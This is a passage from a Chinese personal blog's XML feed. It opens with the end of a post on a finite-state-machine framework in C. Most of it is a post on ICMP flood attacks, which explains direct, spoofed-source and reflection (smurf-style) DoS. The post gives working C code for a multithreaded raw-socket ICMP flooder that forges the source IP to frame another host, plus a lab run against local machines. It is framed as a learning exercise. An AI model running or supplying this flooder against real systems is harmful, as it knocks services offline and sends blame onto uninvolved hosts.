class="line">&#x2F;&#x2F;跳转到下一个状态</span><br><span class="line">FSM_StateTransfer(pFsm, NextState);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F; do nothing</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数我们这样写，然后观察状态机的运转情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">FSM_t fsm;</span><br><span class="line">InitFsm(&amp;fsm);</span><br><span class="line">int event &#x3D; EVENT1; </span><br><span class="line">&#x2F;&#x2F;小明的一天,周而复始的一天又一天，进行着相同的活动</span><br><span class="line">while (1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;event %d is coming...\n&quot;, event);</span><br><span class="line">FSM_EventHandle(&amp;fsm, event);</span><br><span class="line">printf(&quot;fsm current state %d\n&quot;, fsm.curState);</span><br><span class="line">test(&amp;event); </span><br><span class="line">sleep(1);  &#x2F;&#x2F;休眠1秒，方便观察</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一看该状态机跑起来的状态转移情况：</p><p><img src="/2017/06/23/%E6%9C%89%E9%99%90%E7%8A%B6%E6%80%81%E6%9C%BAFSM%E7%9A%84%E7%90%86%E8%A7%A3%E4%B8%8E%E5%AE%9E%E7%8E%B0/1093303-20170623190514710-334307320.png"></p><p>上面的图可以看出，当且仅当在指定的状态下来了指定的事件才会发生函数的执行以及状态的转移，否则不会发生状态的跳转。这种机制使得这个状态机不停地自动运转，有条不絮地完成任务。</p><p>与前两种方法相比，使用函数指针实现FSM能很好用于大规模的切换流程，只要我们实现搭好了FSM框架，以后进行扩展就很简单了（只要在状态表里加一行来写入新的状态处理就可以了）。</p><p>需要FSM完整代码的童鞋请访问<a href="https://github.com/AstarLight/FSM-framework/tree/master">我的github</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>编程框架</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ICMP洪水攻击</title>
    <link href="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/"/>
    <url>/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>ICMP协议实现了PING的程序，ICMP除了实现这么一个PING程序，还有哪些不为人知或者好玩的用途？这里我将介绍ICMP另一个很有名的黑科技：ICMP洪水攻击。</p><p>ICMP洪水攻击属于大名鼎鼎的DOS（Denial of Service）攻击的一种，一种是黑客们喜欢的攻击手段，这里本着加深自己对ICMP的理解的目的，也试着基于ICMP写一段ICMP的洪水攻击小程序。</p><p>洪水攻击（FLOOD ATTACK）指的是利用计算机网络技术向目的主机发送大量无用数据报文，使得目的主机忙于处理无用的数据报文而无法提供正常服务的网络行为。<br>ICMP洪水攻击：顾名思义，就是对目的主机发送洪水般的ping包，使得目的主机忙于处理ping包而无能力处理其他正常请求，这就好像是洪水一般的ping包把目的主机给淹没了。</p><p>要实现ICMP的洪水攻击，需要以下三项的知识储备：</p><ol><li>DOS攻击原理</li><li>ICMP的深入理解</li><li>原始套接字的编程技巧</li></ol><h2 id="一、ICMP洪水攻击原理"><a href="#一、ICMP洪水攻击原理" class="headerlink" title="一、ICMP洪水攻击原理"></a>一、ICMP洪水攻击原理</h2><p>ICMP洪水攻击是在ping的基础上形成的，但是ping程序很少能造成目的及宕机的问题，这是因为ping的发送包的速率太慢了，像我实现的PING程序里ping包发送速率限定在1秒1发，这个速率目的主机处理ping包还是绰绰有余的。所以要造成“洪水”的现象，就必须提升发包速率。这里介绍三种ICMP洪水攻击的方式：</p><p>（1）直接洪水攻击<br>这样做需要本地主机的带宽和目的主机的带宽之间进行比拼，比如我的主机网络带宽是30M的，而你的主机网络带宽仅为3M，那我发起洪水攻击淹没你的主机成功率就很大了。这种攻击方式要求攻击主机处理能力和带宽要大于被攻击主机，否则自身被DoS了。基于这种思想，我们可以使用一台高带宽高性能的电脑，采用多线程的方法一次性发送多个ICMP请求报文，让目的主机忙于处理大量这些报文而造成速度缓慢甚至宕机。这个方法有个大缺点，就是对方可以根据ICMP包的IP地址而屏蔽掉攻击源，使得攻击不能继续。</p><p>（2）伪IP攻击<br>在直接洪水攻击的基础上，我们将发送方的IP地址伪装成其他IP，如果是伪装成一个随机的IP，那就可以很好地隐藏自己的位置；如果将自己的IP伪装成其他受害者的IP，就会造成“挑拨离间”的情形，受害主机1的icmp回复包也如洪水般发送给受害主机2，如果主机1的管理员要查是哪个混蛋发包攻击自己，他一查ICMP包的源地址，咦原来是主机2，这样子主机2就成了戴罪羔羊了。</p><p>（3）反射攻击<br>这类攻击的思想不同于上面两种攻击，反射攻击的设计更为巧妙。其实这里的方式三的攻击模式是前两个模式的合并版以及升级版，方式三的攻击策略有点像“借刀杀人“，反射攻击不再直接对目标主机，而是让其他一群主机误以为目标主机在向他们发送ICMP请求包，然后一群主机向目的主机发送ICMP应答包，造成来自四面八方的洪水淹没目的主机的现象。比如我们向局域网的其他主机发送ICMP请求包，然后自己的IP地址伪装成目的主机的IP，这样子目的主机就成了ICMP回显的焦点了。这种攻击非常隐蔽，因为受害主机很难查出攻击源是谁。</p><p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170213235415910-2043263573.png"></p><h2 id="二、ICMP洪水攻击程序设计"><a href="#二、ICMP洪水攻击程序设计" class="headerlink" title="二、ICMP洪水攻击程序设计"></a>二、ICMP洪水攻击程序设计</h2><p>这里我想实现一个ICMP洪水攻击的例子，这里我想采用方式二来进行设计。虽说方式三的“借刀杀人”更为巧妙，其实也是由方式二的伪装方式进一步延伸的，实现起来也是大同小异。</p><p>首先给出攻击的模型图：</p><p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170213235841910-1275984405.png"></p><h3 id="1-组ICMP包"><a href="#1-组ICMP包" class="headerlink" title="1.组ICMP包"></a>1.组ICMP包</h3><p>这里的组包跟编写PING程序时的组包没太大差别，唯一需要注意的是，我们需要填写IP头部分，因为我们要伪装源地址，做到嫁祸于人。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">void DoS_icmp_pack(char* packet)</span><br><span class="line">&#123;</span><br><span class="line">    struct ip* ip_hdr &#x3D; (struct ip*)packet;</span><br><span class="line">    struct icmp* icmp_hdr &#x3D; (struct icmp*)(packet + sizeof(struct ip));</span><br><span class="line"></span><br><span class="line">    ip_hdr-&gt;ip_v &#x3D; 4;</span><br><span class="line">    ip_hdr-&gt;ip_hl &#x3D; 5;</span><br><span class="line">    ip_hdr-&gt;ip_tos &#x3D; 0;</span><br><span class="line">    ip_hdr-&gt;ip_len &#x3D; htons(ICMP_PACKET_SIZE);</span><br><span class="line">    ip_hdr-&gt;ip_id &#x3D; htons(getpid());</span><br><span class="line">    ip_hdr-&gt;ip_off &#x3D; 0;</span><br><span class="line">    ip_hdr-&gt;ip_ttl &#x3D; 64;</span><br><span class="line">    ip_hdr-&gt;ip_p &#x3D; PROTO_ICMP;</span><br><span class="line">    ip_hdr-&gt;ip_sum &#x3D; 0;</span><br><span class="line">    ip_hdr-&gt;ip_src.s_addr &#x3D; inet_addr(FAKE_IP);; &#x2F;&#x2F;伪装源地址</span><br><span class="line">    ip_hdr-&gt;ip_dst.s_addr &#x3D; dest;  &#x2F;&#x2F;填入要攻击的目的主机地址</span><br><span class="line"></span><br><span class="line">    icmp_hdr-&gt;icmp_type &#x3D; ICMP_ECHO;</span><br><span class="line">    icmp_hdr-&gt;icmp_code &#x3D; 0;</span><br><span class="line">    icmp_hdr-&gt;icmp_cksum &#x3D; htons(~(ICMP_ECHO &lt;&lt; 8));&#x2F;&#x2F;注意这里，因为数据部分为0，我们就简化了一下checksum的计算了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-搭建发包线程"><a href="#2-搭建发包线程" class="headerlink" title="2.搭建发包线程"></a>2.搭建发包线程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void Dos_Attack()</span><br><span class="line">&#123;</span><br><span class="line">    char* packet &#x3D; (char*)malloc(ICMP_PACKET_SIZE);</span><br><span class="line">    memset(packet, 0, ICMP_PACKET_SIZE);</span><br><span class="line">    struct sockaddr_in to;</span><br><span class="line">    DoS_icmp_pack(packet);</span><br><span class="line"></span><br><span class="line">    to.sin_family &#x3D; AF_INET;</span><br><span class="line">    to.sin_addr.s_addr &#x3D; dest;</span><br><span class="line">    to.sin_port &#x3D; htons(0);</span><br><span class="line"></span><br><span class="line">    while(alive)  &#x2F;&#x2F;控制发包的全局变量</span><br><span class="line">    &#123;</span><br><span class="line">        sendto(rawsock, packet, ICMP_PACKET_SIZE, 0, (struct sockaddr*)&amp;to, sizeof(struct sockaddr));        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    free(packet);  &#x2F;&#x2F;记得要释放内存</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-编写发包开关"><a href="#3-编写发包开关" class="headerlink" title="3.编写发包开关"></a>3.编写发包开关</h3><p>这里的开关很简单，用信号量+全局变量即可以实现。当我们按下ctrl+c时，攻击将关闭。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void Dos_Sig()</span><br><span class="line">&#123;</span><br><span class="line">    alive &#x3D; 0;</span><br><span class="line">    printf(&quot;stop DoS Attack!\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-总的架构"><a href="#4-总的架构" class="headerlink" title="4.总的架构"></a>4.总的架构</h3><p>我们使用了64个线程一起发包，当然这个线程数还可以大大增加，来增加攻击强度。但我们只是做做实验，没必要搞那么大。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    struct hostent* host &#x3D; NULL;</span><br><span class="line">    struct protoent* protocol &#x3D; NULL;</span><br><span class="line">    int i;</span><br><span class="line">    alive &#x3D; 1;</span><br><span class="line">    pthread_t attack_thread[THREAD_MAX_NUM];  &#x2F;&#x2F;开64个线程同时发包    </span><br><span class="line">    int err &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    if(argc &lt; 2)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Invalid input!\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    signal(SIGINT, Dos_Sig);</span><br><span class="line"></span><br><span class="line">    protocol &#x3D; getprotobyname(PROTO_NAME);</span><br><span class="line">    if(protocol &#x3D;&#x3D; NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Fail to getprotobyname!\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PROTO_ICMP &#x3D; protocol-&gt;p_proto;</span><br><span class="line"></span><br><span class="line">    dest &#x3D; inet_addr(argv[1]);</span><br><span class="line"></span><br><span class="line">    if(dest &#x3D;&#x3D; INADDR_NONE)</span><br><span class="line">    &#123;</span><br><span class="line">        host &#x3D; gethostbyname(argv[1]);</span><br><span class="line">        if(host &#x3D;&#x3D; NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;Invalid IP or Domain name!\n&quot;);</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">        memcpy((char*)&amp;dest, host-&gt;h_addr, host-&gt;h_length);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rawsock &#x3D; socket(AF_INET, SOCK_RAW, PROTO_ICMP);</span><br><span class="line">    if(rawsock &lt; 0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Fait to create socket!\n&quot;);</span><br><span class="line">        return -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    setsockopt(rawsock, SOL_IP, IP_HDRINCL, &quot;1&quot;, sizeof(&quot;1&quot;));</span><br><span class="line"></span><br><span class="line">    printf(&quot;ICMP FLOOD ATTACK START\n&quot;);</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;THREAD_MAX_NUM;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        err &#x3D; pthread_create(&amp;(attack_thread[i]), NULL, (void*)Dos_Attack, NULL);</span><br><span class="line">        if(err)</span><br><span class="line">        &#123;</span><br><span class="line">            printf(&quot;Fail to create thread, err %d, thread id : %d\n&quot;,err, attack_thread[i]);            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for(i&#x3D;0;i&lt;THREAD_MAX_NUM;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(attack_thread[i], NULL);   &#x2F;&#x2F;等待线程结束</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;ICMP ATTACK FINISHI!\n&quot;);</span><br><span class="line"></span><br><span class="line">    close(rawsock);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="三、实验"><a href="#三、实验" class="headerlink" title="三、实验"></a>三、实验</h2><p>本次实验本着学习的目的，想利用自己手上的设备，想进一步理解网络和协议的应用，所以攻击的幅度比较小，时间也就几秒，不对任何设备造成影响。</p><p>再说一下我们的攻击步骤：我们使用主机172.0.5.183作为自己的攻击主机，并将自己伪装成主机172.0.5.182，对主机172.0.5.9发起ICMP洪水攻击。</p><p>攻击开始</p><p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000442425-1603699988.png"></p><p>我们观察一下”受害者“那边的情况。在短短5秒里，正确收到并交付上层处理的包也高达7万多个了。我也不敢多搞事，避免影响机器工作。</p><p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000518847-108927127.png"></p><p>使用wireshark抓包再瞧一瞧，满满的ICMP包啊，看来量也是很大的。ICMP包的源地址显示为172.0.5.182（我们伪装的地址），它也把echo reply回给了172.0.5.182。主机172.0.5.182肯定会想，莫名其妙啊，怎么收到这么多echo reply包。</p><p><img src="/2017/02/14/ICMP%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1093303-20170214000552175-594982086.png"></p><p>攻击实验做完了。</p><p>现在更为流行的是DDOS攻击，其威力更为强悍，策略更为精巧，防御难度也更加高。<br>其实，这种DDoS攻击也是在DOS的基础上发起的，具体步骤如下：</p><ol><li>攻击者向“放大网络”广播echo request报文</li><li>攻击者指定广播报文的源IP为被攻击主机</li><li>“放大网络”回复echo reply给被攻击主机</li><li>形成DDoS攻击场景</li></ol><p>这里的“放大网络”可以理解为具有很多主机的网络，这些主机的操作系统需要支持对目的地址为广播地址的某种ICMP请求数据包进行响应。</p><p>攻击策略很精妙，简而言之，就是将源地址伪装成攻击主机的IP，然后发广播的给所有主机，主机们收到该echo request后集体向攻击主机回包，造成群起而攻之的情景。</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
